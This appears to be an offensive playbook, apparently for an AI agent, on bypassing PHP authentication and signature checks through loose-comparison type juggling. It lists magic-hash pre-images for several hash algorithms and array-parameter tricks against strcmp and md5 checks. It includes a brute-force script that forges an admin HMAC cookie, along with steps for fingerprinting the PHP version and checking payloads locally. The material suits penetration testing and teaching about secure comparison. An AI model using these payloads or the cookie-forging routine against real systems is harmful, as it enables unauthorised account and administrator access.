# PHP type juggling & magic hashes — Open WHEN: the target is PHP (or another loosely-typed stack) and a hash, token, HMAC, signature, or password is checked with loose comparison so that you can bypass it with a type-confusing value instead of the real secret.

PHP's `==` / `!=` perform *loose* comparison: before comparing, PHP may cast
strings to numbers and apply surprising equality rules. When user-controlled
input is compared to a secret with `==` (not `===`), you can often make the
check pass without knowing the secret. This is an authentication / signature
bypass, not a crypto-strength break.

## Loose vs strict

* **Loose** (`==` / `!=`): "same value" after type coercion — vulnerable.
* **Strict** (`===` / `!==`): "same type AND same value" — safe.

## True statements you can abuse (PHP 7; many also PHP 5)

| Statement | Result |
|---|---|
| `'0010e2'   == '1e3'` | true (both parse as 1000 in scientific notation) |
| `'123'  == 123` | true |
| `'123a' == 123` | true (leading numeric part used) |
| `'abc'  == 0` | true on PHP < 8 (non-numeric string casts to 0) |
| `'' == 0`, `0 == false`, `false == NULL`, `NULL == ''` | true (the classic empty/zero/null chain) |
| `'0x01' == 1`, `'0xABCdef' == ' 0xABCdef'` | true on PHP 5 only (hex strings parsed) |

PHP 5-only behaviours (leading-space / hex-string parsing) are listed in the
full table — try them when you fingerprint an old PHP.

### Empty / array results that defeat naive checks

| Code | Returns | Abuse |
|---|---|---|
| `md5([])`, `sha1([])` | `NULL` (with a warning) | If a hash of user input is compared to a stored hash and you pass an **array** for the input (`param[]=x`), the computed hash is `NULL`; `NULL == NULL` (or `NULL == ''`) can pass. |
| `strcmp($_GET['x'], $secret)` with `x[]=` | `NULL` on PHP < 8 | `0 == strcmp(array, str)` → `0 == NULL` → true, bypassing a `strcmp(...)==0` auth check. |

## Magic hashes (the `0e` trick)

If a hash string starts with `0e` followed by **only digits**, loose comparison
treats it as scientific notation = `0.0`. So **any two inputs whose hashes are
both `0e[0-9]+` compare equal**. If an app does
`md5($_POST['password']) == $stored_hash` and the stored hash happens to be a
`0e…` magic hash (or the app compares two computed hashes), submit a known
magic-hash pre-image to make the check pass.

```php
var_dump(md5('240610708') == md5('QNKCDZO'));   // bool(true) — both are 0e…
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));  // bool(true)
```

### Magic-hash pre-images to try (input → hash form `0e…`)

| Algo | Input string | Resulting hash (all `0e` + digits) |
|---|---|---|
| MD5 | `240610708` | `0e462097431906509019562988736854` |
| MD5 | `QNKCDZO` | `0e830400451993494058024219903391` |
| MD5 | `0e1137126905` | `0e291659922323405260514745084877` |
| MD5 | `0e215962017` | `0e291242476940776845150308577824` |
| MD5 | `aabg7XSs` | (collides with `aabC9RqS`) |
| SHA1 | `10932435112` | `0e07766915004133176347055865026311692244` |
| SHA1 | `aaroZmOk` | (collides with `aaK1STfY`) |
| SHA1 | `aaO8zKZF` | (collides with `aa3OFF9m`) |
| SHA-224 | `10885164793773` | `0e2812509467752001…` |
| SHA-256 | `34250003024812` | `0e4628903203806591…` |
| SHA-256 | `TyNOQHUS` | `0e6629869435920759…` |
| MD4 | `gH0nAdHk` | `0e096229559581069251163783434175` |
| MD4 | `IiF+hTai` | `00e90130237707355082822449868597` |

Match the algorithm to whatever the app uses (token length: 32 hex = MD5, 40 =
SHA1, 56 = SHA-224, 64 = SHA-256). Submit the corresponding input where the app
hashes your value, or submit a `0e…` magic-hash string directly where the app
compares a provided hash.

## Methodology: loose HMAC / signature bypass

A common vulnerable pattern signs a cookie and checks it loosely:

```php
$hash = hash_hmac('md5', $cookie['username'].'|'.$cookie['expiration'], $key);
if ($cookie['hmac'] != $hash) { return false; }   // loose !=
```

You control three values: `username` (set to `admin`), `expiration` (a future
unix timestamp), and `hmac` (set to the string `"0"`). Brute-force `expiration`
until the server's HMAC happens to start with `0e` followed by only digits — at
that point `"0" != "0e…"` is **false** (both cast to 0), so the check passes.

```php
for ($i = 1424869663; $i < 1835970773; $i++) {
    $out = hash_hmac('md5', 'admin|'.$i, '');   // empty key assumed here
    if (str_starts_with($out, '0e') && $out == 0) { echo "$i - $out"; break; }
}
// example hit: 1539805986 -> 0e772967136366835494939987377058
// final cookie: username=admin, expiration=1539805986, hmac=0
```

## Verify candidates locally

The `php` CLI is available — confirm a juggling result before sending it:

```bash
php -r 'var_dump(md5("240610708") == md5("QNKCDZO"));'   # bool(true)
php -r 'var_dump("0e123" == "0e456");'                    # bool(true)
php -r 'var_dump(strcmp([], "secret"));'                  # NULL on PHP<8
```

## PHP 8 caveats

PHP 8 fixed the "Saner string to number comparisons" cases: `'abc' == 0` is now
**false**, and `0e…` collisions no longer juggle for non-numeric strings.
Internal functions like `strcmp` now throw instead of returning `NULL`. So:
magic-hash and `0e` tricks mainly land on PHP 5–7. Fingerprint the PHP version
(`X-Powered-By` header, error wording) before relying on these; on PHP 8 fall
back to array-type (`param[]=`) tricks only where the code path predates the
strict-internal-functions behaviour.

## Other loosely-typed stacks

Loose-comparison quirks also exist in MySQL/MariaDB, Node.js, Perl, Postgres,
Python, and SQLite comparison semantics — if the auth/signature check is in one
of those, test whether numeric-string coercion or empty/null coercion lets a
crafted value equal the secret. PHP is just the most exploited case.
